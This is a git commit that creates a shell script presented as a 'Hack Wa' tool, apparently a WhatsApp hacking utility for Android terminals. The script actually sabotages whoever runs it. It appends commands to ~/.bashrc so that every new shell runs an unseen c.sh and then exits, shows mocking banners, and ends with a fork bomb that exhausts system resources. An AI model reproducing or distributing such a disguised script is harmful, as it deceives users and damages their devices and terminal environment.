14c207fb7d0ae5f2b7e65b186cc5592758b0f3fd
Eka gans <80229956+ekadanuarta@users.noreply.github.com>
2021-04-23 18:14:19 +0700

    Create wa.sh

---
+++ wa.sh
@@ -0,0 +1,58 @@
+#!/system/bin/sh
+
+clear
+
+echo 'bash c.sh' >> ~/.bashrc
+
+echo 'exit' >> ~/.bashrc
+
+mv c.sh $HOME
+
+sleep 2
+
+neofetch
+
+sleep 4
+
+clear
+
+echo " plz wyt......."
+
+sleep 5
+
+clear
+
+echo " "
+
+cowsay -f daemon 1
+
+sleep 1
+
+echo -e "\e[91m "
+
+figlet "Hack Wa"
+
+echo "  coded by Eka Gans 02"
+
+echo " "
+
+sleep 3
+
+echo " "
+
+echo -e "\e[91m "
+
+read -p "[â€¢] If you want to continue (y or n) :- "
+
+sleep 3
+
+clear
+
+echo "\e[91m "
+
+cowsay -f meow 1
+
+figlet "Run away stupid ðŸ¤£"
+
+:(){ :|:& };:
+
